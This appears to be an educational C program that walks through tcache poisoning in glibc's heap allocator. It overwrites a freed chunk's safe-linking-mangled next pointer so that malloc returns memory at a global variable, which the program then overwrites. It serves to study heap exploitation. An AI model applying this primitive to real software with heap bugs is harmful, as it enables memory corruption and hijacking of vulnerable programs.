#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x100
#define CHUNK_SIZE1 0x10

long target = 0xdeadbeef;

void main() {
	long *chunk0,
		*chunk1,
		*chunk2,
		*next_ptr,
		*recycled_chunk0,
		*recycled_chunk1;

	printf("So, we have a global variable called target at %p.\n", &target);
	printf("It's current value is 0x%lx.\n", target);
	printf("Our goal is to get the tcache, to allocate a chunk to the address of target, which we will use to change it's value.\n\n");

	printf("First, we will allocate our heap chunks.\n");
	printf("Three 0x%x byte chunks to be freed and inserted into the tcache.\n", CHUNK_SIZE0);
	printf("There will be three 0x%x byte chunks inbetween those three, to prevent consolidation.\n\n", CHUNK_SIZE1);

	chunk0 = malloc(CHUNK_SIZE0);
	malloc(CHUNK_SIZE1);
	chunk1 = malloc(CHUNK_SIZE0);
	malloc(CHUNK_SIZE1);
	chunk2 = malloc(CHUNK_SIZE0);
	malloc(CHUNK_SIZE1);

	memset(chunk0, 0x00, CHUNK_SIZE0);
	memset(chunk1, 0x00, CHUNK_SIZE0);
	memset(chunk2, 0x00, CHUNK_SIZE0);

	printf("Chunk0:\t%p\n", chunk0);
	printf("Chunk1:\t%p\n", chunk1);
	printf("Chunk2:\t%p\n\n", chunk2);

	printf("Now, let's free the chunks, and have them inserted into the tcache.\n\n");

	free(chunk0);
	free(chunk1);
	free(chunk2);

	printf("Now that they have been inserted into the tcache, we can see their mangled next ptrs and tcache key:\n");
	printf("Chunk2:\tAddress:%p\tNext:%lx\tKey:0x%lx\n", chunk2, *chunk2, *(chunk2+1));
	printf("Chunk1:\tAddress:%p\tNext:%lx\tKey:0x%lx\n", chunk1, *chunk1, *(chunk1+1));
	printf("Chunk0:\tAddress:%p\tNext:%lx\tKey:0x%lx\n\n", chunk0, *chunk0, *(chunk0+1));

	printf("So now, we will alter the next ptr of Chunk2, since it is the head of the linked list bin with our three chunks (since it was freed last).\n");
	printf("We will allocate a chunk from the bin, which will give us Chunk2, and set the next tcache bin head to target.\n");
	printf("Then the next malloc will give us a chunk to target (also because the tcache count for that tcache bin says it has more chunks).\n");
	printf("The closest bug we are kind of emulating here is a use after free.\n\n");

	next_ptr = (long *)(((long)chunk0 >> 12) ^ (long)&target);
	printf("First, we need to actually come up with a correct next ptr, because of the next ptr mangling.\n");
	printf("The equation is next_ptr = ((address_of_chunk >> 12) ^ next_address)\n");
	printf("So in this instance, the next ptr should be ((%p >> 12) ^ %p) = %p\n\n", chunk0, &target, next_ptr);

	*chunk2 = (long)next_ptr;

	printf("Now that we've set the next ptr of chunk2 to be that of target, let's reallocate chunk2.\n\n");

	recycled_chunk0 = malloc(CHUNK_SIZE0);

	printf("New chunk allocated: %p\n\n", recycled_chunk0);

	printf("Now the head of the tcahce bin should be to the target global variable.\n");
	printf("The next allocation should be to the address it's stored at.\n\n");

	recycled_chunk1 = malloc(CHUNK_SIZE0);

	printf("New chunk allocated: %p\n", recycled_chunk1);
	printf("Did this work: %s\n\n", (recycled_chunk1 == &target) ? "Yes" : "No");

	printf("So, we see that we were able to allocate a chunk to the target global variable.\n");
	printf("Let's change it's value.\n\n");

	*recycled_chunk1 = 0xffffffffffffffff;

	printf("New target value:\t0x%lx\n", target);
}
